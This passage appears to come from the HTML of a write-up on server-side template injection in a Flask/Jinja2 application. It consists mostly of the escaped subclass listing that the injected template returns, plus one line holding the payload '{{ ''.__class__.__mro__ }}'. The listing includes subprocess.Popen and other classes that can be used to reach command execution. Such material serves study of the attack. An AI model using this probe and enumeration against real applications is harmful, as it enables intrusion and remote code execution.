&amp;#39;_thread._local&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_thread.lock&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_thread.RLock&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_io._IOBase&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_io._BytesIOBuffer&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_io.IncrementalNewlineDecoder&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;posix.ScandirIterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;posix.DirEntry&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_frozen_importlib_external.WindowsRegistryFinder&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_frozen_importlib_external._LoaderBasics&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_frozen_importlib_external.FileLoader&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_frozen_importlib_external._NamespacePath&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_frozen_importlib_external._NamespaceLoader&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_frozen_importlib_external.PathFinder&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_frozen_importlib_external.FileFinder&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;zipimport.zipimporter&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;zipimport._ZipImportResourceReader&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;codecs.Codec&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;codecs.IncrementalEncoder&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;codecs.IncrementalDecoder&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;codecs.StreamReaderWriter&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;codecs.StreamRecoder&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_abc_data&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;abc.ABC&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;dict_itemiterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;collections.abc.Hashable&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;collections.abc.Awaitable&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;collections.abc.AsyncIterable&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;async_generator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;collections.abc.Iterable&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;bytes_iterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;bytearray_iterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;dict_keyiterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;dict_valueiterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;list_iterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;list_reverseiterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;range_iterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;set_iterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;str_iterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;tuple_iterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;collections.abc.Sized&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;collections.abc.Container&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;collections.abc.Callable&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;os._wrap_close&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_sitebuiltins.Quitter&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_sitebuiltins._Printer&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_sitebuiltins._Helper&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;operator.itemgetter&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;operator.attrgetter&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;operator.methodcaller&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;itertools.accumulate&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;itertools.combinations&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;itertools.combinations_with_replacement&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;itertools.cycle&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;itertools.dropwhile&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;itertools.takewhile&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;itertools.islice&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;itertools.starmap&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;itertools.chain&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;itertools.compress&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;itertools.filterfalse&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;itertools.count&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;itertools.zip_longest&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;itertools.permutations&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;itertools.product&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;itertools.repeat&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;itertools.groupby&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;itertools._grouper&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;itertools._tee&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;itertools._tee_dataobject&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;reprlib.Repr&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;collections.deque&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_collections._deque_iterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_collections._deque_reverse_iterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_collections._tuplegetter&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;collections._Link&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;functools.partial&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;functools._lru_cache_wrapper&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;functools.partialmethod&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;functools.singledispatchmethod&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;functools.cached_property&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;types.DynamicClassAttribute&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;types._GeneratorWrapper&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;enum.auto&amp;#39;&amp;gt;, &amp;lt;enum &amp;#39;Enum&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;re.Pattern&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;re.Match&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_sre.SRE_Scanner&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;sre_parse.State&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;sre_parse.SubPattern&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;sre_parse.Tokenizer&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;re.Scanner&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;string.Template&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;string.Formatter&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;contextlib.ContextDecorator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;contextlib._GeneratorContextManagerBase&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;contextlib._BaseExitStack&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;typing._Final&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;typing._Immutable&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;typing.Generic&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;typing._TypingEmpty&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;typing._TypingEllipsis&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;typing.NamedTuple&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;typing.io&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;typing.re&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_ast.AST&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;markupsafe._MarkupEscapeHelper&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;select.poll&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;select.epoll&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;selectors.BaseSelector&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_socket.socket&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_weakrefset._IterationGuard&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_weakrefset.WeakSet&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;threading._RLock&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;threading.Condition&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;threading.Semaphore&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;threading.Event&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;threading.Barrier&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;threading.Thread&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;socketserver.BaseServer&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;socketserver.ForkingMixIn&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;socketserver._NoThreads&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;socketserver.ThreadingMixIn&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;socketserver.BaseRequestHandler&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;warnings.WarningMessage&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;warnings.catch_warnings&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;datetime.date&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;datetime.timedelta&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;datetime.time&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;datetime.tzinfo&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;weakref.finalize._Info&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;weakref.finalize&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_sha512.sha384&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_sha512.sha512&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_random.Random&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;urllib.parse._ResultMixinStr&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;urllib.parse._ResultMixinBytes&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;urllib.parse._NetlocResultMixinBase&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;calendar._localized_month&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;calendar._localized_day&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;calendar.Calendar&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;calendar.different_locale&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;email._parseaddr.AddrlistClass&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;Struct&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;unpack_iterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;email.charset.Charset&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;email.header.Header&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;email.header._ValueFormatter&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;email._policybase._PolicyBase&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;email.feedparser.BufferedSubFile&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;email.feedparser.FeedParser&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;email.parser.Parser&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;email.parser.BytesParser&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;email.message.Message&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;http.client.HTTPConnection&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_ssl._SSLContext&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_ssl._SSLSocket&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_ssl.MemoryBIO&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_ssl.Session&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;ssl.SSLObject&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;mimetypes.MimeTypes&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;zlib.Compress&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;zlib.Decompress&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_bz2.BZ2Compressor&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_bz2.BZ2Decompressor&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_lzma.LZMACompressor&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_lzma.LZMADecompressor&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;dis.Bytecode&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;tokenize.Untokenizer&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;inspect.BlockFinder&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;inspect._void&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;inspect._empty&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;inspect.Parameter&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;inspect.BoundArguments&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;inspect.Signature&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;traceback.FrameSummary&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;traceback.TracebackException&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;logging.LogRecord&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;logging.PercentStyle&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;logging.Formatter&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;logging.BufferingFormatter&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;logging.Filter&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;logging.Filterer&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;logging.PlaceHolder&amp;#39;&amp;gt;, &amp;lt;class {{ &#39;&#39;.__class__.__mro__ }}</span>
<a id=__codelineno-18-11 name=__codelineno-18-11></a><span class=go>&amp;#39;logging.Manager&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;logging.LoggerAdapter&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug._internal._Missing&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.exceptions.Aborter&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.urls.Href&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;subprocess.CompletedProcess&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;subprocess.Popen&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_hashlib.HASH&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_blake2.blake2b&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_blake2.blake2s&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_sha3.sha3_224&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_sha3.sha3_256&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_sha3.sha3_384&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_sha3.sha3_512&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_sha3.shake_128&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_sha3.shake_256&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;tempfile._RandomNameSequence&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;tempfile._TemporaryFileCloser&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;tempfile._TemporaryFileWrapper&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;tempfile.SpooledTemporaryFile&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;tempfile.TemporaryDirectory&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;urllib.request.Request&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;urllib.request.OpenerDirector&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;urllib.request.BaseHandler&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;urllib.request.HTTPPasswordMgr&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;urllib.request.AbstractBasicAuthHandler&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;urllib.request.AbstractDigestAuthHandler&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;urllib.request.URLopener&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;urllib.request.ftpwrapper&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;http.cookiejar.Cookie&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;http.cookiejar.CookiePolicy&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;http.cookiejar.Absent&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;http.cookiejar.CookieJar&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.datastructures.ImmutableListMixin&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.datastructures.ImmutableDictMixin&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.datastructures._omd_bucket&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.datastructures.Headers&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.datastructures.ImmutableHeadersMixin&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.datastructures.IfRange&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.datastructures.Range&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.datastructures.ContentRange&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.datastructures.FileStorage&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;dataclasses._HAS_DEFAULT_FACTORY_CLASS&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;dataclasses._MISSING_TYPE&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;dataclasses._FIELD_BASE&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;dataclasses.InitVar&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;dataclasses.Field&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;dataclasses._DataclassParams&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.sansio.multipart.Event&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.sansio.multipart.MultipartDecoder&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.sansio.multipart.MultipartEncoder&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;importlib.abc.Finder&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;importlib.abc.Loader&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;importlib.abc.ResourceReader&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;pkgutil.ImpImporter&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;pkgutil.ImpLoader&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;hmac.HMAC&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.wsgi.ClosingIterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.wsgi.FileWrapper&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.wsgi._RangeWrapper&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.utils.HTMLBuilder&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.wrappers.accept.AcceptMixin&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.wrappers.auth.AuthorizationMixin&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.wrappers.auth.WWWAuthenticateMixin&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_json.Scanner&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_json.Encoder&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;json.decoder.JSONDecoder&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;json.encoder.JSONEncoder&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.formparser.FormDataParser&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.formparser.MultiPartParser&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.user_agent.UserAgent&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.useragents._UserAgentParser&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.sansio.request.Request&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.wrappers.request.StreamOnlyMixin&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.sansio.response.Response&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.wrappers.response.ResponseStream&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.wrappers.response.ResponseStreamMixin&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.wrappers.common_descriptors.CommonRequestDescriptorsMixin&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.wrappers.common_descriptors.CommonResponseDescriptorsMixin&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.wrappers.etag.ETagRequestMixin&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.wrappers.etag.ETagResponseMixin&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.wrappers.user_agent.UserAgentMixin&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.test._TestCookieHeaders&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.test._TestCookieResponse&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.test.EnvironBuilder&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.test.Client&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;decimal.Decimal&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;decimal.Context&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;decimal.SignalDictMixin&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;decimal.ContextManager&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;numbers.Number&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;uuid.UUID&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_pickle.Unpickler&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_pickle.Pickler&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_pickle.Pdata&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_pickle.PicklerMemoProxy&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_pickle.UnpicklerMemoProxy&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;pickle._Framer&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;pickle._Unframer&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;pickle._Pickler&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;pickle._Unpickler&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.bccache.Bucket&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.bccache.BytecodeCache&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.utils.MissingType&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.utils.LRUCache&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.utils.Cycler&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.utils.Joiner&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.utils.Namespace&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.nodes.EvalContext&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.nodes.Node&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.visitor.NodeVisitor&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.idtracking.Symbols&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.compiler.MacroRef&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.compiler.Frame&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.runtime.TemplateReference&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.runtime.Context&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.runtime.BlockReference&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.runtime.LoopContext&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.runtime.Macro&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.runtime.Undefined&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;ast.NodeVisitor&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.lexer.Failure&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.lexer.TokenStreamIterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.lexer.TokenStream&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.lexer.Lexer&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.parser.Parser&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.environment.Environment&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.environment.Template&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.environment.TemplateModule&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.environment.TemplateExpression&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.environment.TemplateStream&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.loaders.BaseLoader&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.local.Local&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.local.LocalStack&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.local.LocalManager&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.local._ProxyLookup&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.local.LocalProxy&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;difflib.SequenceMatcher&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;difflib.Differ&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;difflib.HtmlDiff&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;pprint._safe_key&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;pprint.PrettyPrinter&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.routing.RuleFactory&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.routing.RuleTemplate&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.routing.BaseConverter&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.routing.Map&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.routing.MapAdapter&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;gettext.NullTranslations&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;click._compat._FixupStream&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;click._compat._AtomicFile&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;click.utils.LazyFile&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;click.utils.KeepOpenFile&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;click.utils.PacifyFlushWrapper&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;click.types.ParamType&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;click.parser.Option&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;click.parser.Argument&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;click.parser.ParsingState&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;click.parser.OptionParser&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;click.formatting.HelpFormatter&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;click.core.Context&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;click.core.BaseCommand&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;click.core.Parameter&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;flask.signals.Namespace&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;flask.signals._FakeSignal&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;flask.cli.DispatchingApp&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;flask.cli.ScriptInfo&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;flask.config.ConfigAttribute&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;flask.ctx._AppCtxGlobals&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;flask.ctx.AppContext&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;flask.ctx.RequestContext&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;flask.scaffold.Scaffold&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;itsdangerous._json._CompactJSON&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;itsdangerous.signer.SigningAlgorithm&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;itsdangerous.signer.Signer&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;itsdangerous.serializer.Serializer&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;flask.json.tag.JSONTag&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;flask.json.tag.TaggedJSONSerializer&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;flask.sessions.SessionInterface&amp;#39;&amp;gt;, 